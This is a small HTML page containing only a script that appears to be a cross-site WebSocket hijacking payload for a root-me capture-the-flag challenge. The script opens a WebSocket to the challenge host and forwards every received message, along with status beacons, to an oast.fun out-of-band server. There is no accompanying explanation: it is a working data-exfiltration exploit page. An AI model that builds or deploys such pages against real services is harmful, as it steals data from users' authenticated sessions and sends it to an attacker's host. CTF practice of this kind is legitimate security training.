<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
</head>
<body>
<script>
    function beacon(msg) {
        fetch("https://zzuwmhquorgudjdpemhho6v60fd1xj2uo.oast.fun/" + encodeURIComponent(msg), {
          mode: "no-cors"
        });
    }
    beacon("script_start");    
    
          var ws;
          try {
            ws = new WebSocket("ws://ctf29.root-me.org/ws");
                beacon("ws_object_created");
              } catch (e) {
                beacon("ws_constructor_error");
          }

        ws.onopen = function() {
            ws.send("hello");
        };

        ws.onmessage = function(event) {
            fetch('https://zzuwmhquorgudjdpemhho6v60fd1xj2uo.oast.fun', {
                method: 'POST',
                mode: 'no-cors',
                body: event.data
            });
        };
</script>

</body>
